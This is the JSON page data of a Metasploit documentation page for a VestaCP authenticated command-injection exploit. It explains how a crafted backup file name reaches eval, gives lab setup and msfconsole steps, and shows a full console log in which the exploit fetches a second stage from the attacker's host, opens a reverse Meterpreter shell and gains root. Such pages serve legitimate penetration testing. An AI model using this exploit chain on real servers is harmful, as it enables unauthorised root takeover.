{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/linux/http/vestacp_exec","result":{"data":{"moduleMetadataJson":{"id":"21962c60-2b16-5ea7-a22d-299d3a07a72d","name":"Vesta Control Panel Authenticated Remote Code Execution","fullname":"exploit/linux/http/vestacp_exec","description":"This module exploits an authenticated command injection vulnerability in the v-list-user-backups\n          bash script file in Vesta Control Panel to gain remote code execution as the root user.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/linux/http/vestacp_exec","documentationSlug":"/modules/documentation/exploit/linux/http/vestacp_exec"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>This module exploits command injection vulnerability in v-list-user-backups bash script file. Low privileged authenticated users can execute arbitrary commands under the context of the root user.</p>\n<p>To exploit this vulnerability, an authenticated attacker with low privileges can request VestaCP backup a file whose file name starts with a '.', followed by the ';' character to escape the current command, and finally the command they wish to execute. During the user backup process, this file name will be evaluated by the v-backup-user bash script, which will not perform appropriate input validation prior to passing this file name to an eval() call. As result, when an attacker tries to list existing backups the injected command will be executed by the v-backup-user bash script and will result in the attacker's injected command being executed as the root user.</p>\n<h2 id=\"installing-the-vulnerable-application-on-ubuntu-1803-lts\" style=\"position:relative;\"><a href=\"#installing-the-vulnerable-application-on-ubuntu-1803-lts\" aria-label=\"installing the vulnerable application on ubuntu 1803 lts permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Installing the Vulnerable Application on Ubuntu 18.03 LTS</h2>\n<p>You can install Vesta Control Panel on Ubuntu 18.04 LTS server with the following commands:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">ssh root@your.server\ncurl -O http://vestacp.com/pub/vst-install.sh\nbash vst-install.sh</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span></span></pre></div>\n<p>Once you have finished the installation, perform the following actions in order to create a unprivileged user:</p>\n<p>1 - Go to <a href=\"https://*IP\">https://*IP</a> ADDR*:8083/</p>\n<p>2 - Login with your administrator account.</p>\n<p>3 - Click on the \"User\" section under the top navigation menu. When you move your mouse over the text for\nthe \"User\" section, it will turn orange. This is the link that you need to click!</p>\n<p>4 - The URL in your browser should now be <a href=\"https://*IP\">https://*IP</a> ADDR*:8083/list/user/</p>\n<p>5 - Click on the green plus sign on the left side of the page. When you move your mouse\nover this button, it will say \"ADD USER\".</p>\n<p>6 - In the following user creation form that appears, enter values for the \"user\", \"password\", \"email\", \"first name\",\nand \"last name\" fields. Leave package and language options as is, as these fields do not affect exploitation.</p>\n<p>7 - Log out of your admin account.</p>\n<p>8 - Browse to <a href=\"https://*IP\">https://*IP</a> ADDR*:8083/</p>\n<p>9 - Verify that the new low privileged user has been created and that you can log in using their credentials.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<p>A successful check of the exploit will look similar to the output shown below:</p>\n<ol>\n<li>Start <code class=\"language-text\">msfconsole</code></li>\n<li><code class=\"language-text\">use exploit/linux/http/vestacp_exec</code></li>\n<li>Set <code class=\"language-text\">RHOST</code></li>\n<li>Set <code class=\"language-text\">LHOST</code></li>\n<li>Set <code class=\"language-text\">USERNAME</code></li>\n<li>Set <code class=\"language-text\">PASSWORD</code></li>\n<li>Set <code class=\"language-text\">SRVHOST</code></li>\n<li>Set <code class=\"language-text\">SRVPORT</code></li>\n<li>Run <code class=\"language-text\">exploit</code></li>\n<li><strong>Verify</strong> that you are seeing <code class=\"language-text\">Successfully authenticated to the FTP service</code> in the console.</li>\n<li><strong>Verify</strong> that you are seeing <code class=\"language-text\">Successfully uploaded the payload as a file name</code> in the console.</li>\n<li><strong>Verify</strong> that you are seeing <code class=\"language-text\">Successfully authenticated to the HTTP Service</code> in the console.</li>\n<li><strong>Verify</strong> that you are seeing <code class=\"language-text\">Scheduled backup has ben started. Exploitation may take up to 5 minutes.</code> in the console.</li>\n<li><strong>Verify</strong> that you are seeing <code class=\"language-text\">It seems there is an active backup process ! Recheck after 30 second. Zzzzzz...</code> in the console.</li>\n<li><strong>Verify</strong> that you are seeing <code class=\"language-text\">First stage is executed ! Sending 2nd stage of the payload</code> in the console.</li>\n<li><strong>Verify</strong> that you are getting a Meterpreter session.</li>\n</ol>\n<h2 id=\"ubuntu-1804-lts-with-vestacp-0926\" style=\"position:relative;\"><a href=\"#ubuntu-1804-lts-with-vestacp-0926\" aria-label=\"ubuntu 1804 lts with vestacp 0926 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Ubuntu 18.04 LTS with VestaCP 0.9.26</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use exploit/linux/http/vestacp_exec\nmsf5 exploit(linux/http/vestacp_exec) &gt; set RHOSTS 192.168.74.218\nRHOSTS =&gt; 192.168.74.218\nmsf5 exploit(linux/http/vestacp_exec) &gt; set USERNAME user11\nUSERNAME =&gt; user11\nmsf5 exploit(linux/http/vestacp_exec) &gt; set PASSWORD qwe123\nPASSWORD =&gt; qwe123\nmsf5 exploit(linux/http/vestacp_exec) &gt; set LHOST 192.168.74.1\nLHOST =&gt; 192.168.74.1\nmsf5 exploit(linux/http/vestacp_exec) &gt; set SRVHOST 192.168.74.1\nSRVHOST =&gt; 192.168.74.1\nmsf5 exploit(linux/http/vestacp_exec) &gt; set SRVPORT 8081\nSRVPORT =&gt; 8081\nmsf5 exploit(linux/http/vestacp_exec) &gt; run\n[*] Exploit running as background job 32.\n[*] Exploit completed, but no session was created.\n\n[*] Started reverse TCP handler on 192.168.74.1:4444\n[*] 192.168.74.218:8083 - Using URL: http://192.168.74.1:8081/poSeL7s\nmsf5 exploit(linux/http/vestacp_exec) &gt; [*] 192.168.74.218:8083 - Second payload download URI is http://192.168.74.1:8081/poSeL7s\n[+] 192.168.74.218:21 - Successfully authenticated to the FTP service\n[+] 192.168.74.218:21 - The file with the payload in the file name has been successfully uploaded.\n[*] 192.168.74.218:8083 - Retrieving cookie and csrf token values\n[+] 192.168.74.218:8083 - Cookie and CSRF token values successfully retrieved\n[*] 192.168.74.218:8083 - Authenticating to HTTP Service with given credentials\n[+] 192.168.74.218:8083 - Successfully authenticated to the HTTP Service\n[*] 192.168.74.218:8083 - Starting scheduled backup. Exploitation may take up to 5 minutes.\n[+] 192.168.74.218:8083 - Scheduled backup has been started !\n[*] 192.168.74.218:8083 - It seems there is an active backup process ! Recheck after 30 second. Zzzzzz...\n[*] 192.168.74.218:8083 - It seems there is an active backup process ! Recheck after 30 second. Zzzzzz...\n[*] 192.168.74.218:8083 - It seems there is an active backup process ! Recheck after 30 second. Zzzzzz...\n[*] 192.168.74.218:8083 - It seems there is an active backup process ! Recheck after 30 second. Zzzzzz...\n[*] 192.168.74.218:8083 - It seems there is an active backup process ! Recheck after 30 second. Zzzzzz...\n[*] 192.168.74.218:8083 - It seems there is an active backup process ! Recheck after 30 second. Zzzzzz...\n[*] 192.168.74.218:8083 - It seems there is an active backup process ! Recheck after 30 second. Zzzzzz...\n[*] 192.168.74.218:8083 - It seems there is an active backup process ! Recheck after 30 second. Zzzzzz...\n[*] 192.168.74.218:8083 - It seems there is an active backup process ! Recheck after 30 second. Zzzzzz...\n[*] 192.168.74.218:8083 - It seems there is an active backup process ! Recheck after 30 second. Zzzzzz...\n[+] 192.168.74.218:8083 - First stage is executed ! Sending 2nd stage of the payload\n[*] Sending stage (53755 bytes) to 192.168.74.218\n[*] Meterpreter session 8 opened (192.168.74.1:4444 -&gt; 192.168.74.218:58790) at 2020-04-11 14:35:23 +0300\n\nmsf5 exploit(linux/http/vestacp_exec) &gt; sessions -i 8\n[*] Starting interaction with 8...\n\nmeterpreter &gt; shell\nProcess 42978 created.\nChannel 1 created.\n/bin/sh: 0: can&#39;t access tty; job control turned off\n# id\nuid=0(root) gid=0(root) groups=0(root)\nmeterpreter &gt; shell\n[+] 192.168.74.218:8083 - It seems scheduled backup is done ..! Triggering the payload &lt;3\n\n#</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"21962c60-2b16-5ea7-a22d-299d3a07a72d"}}}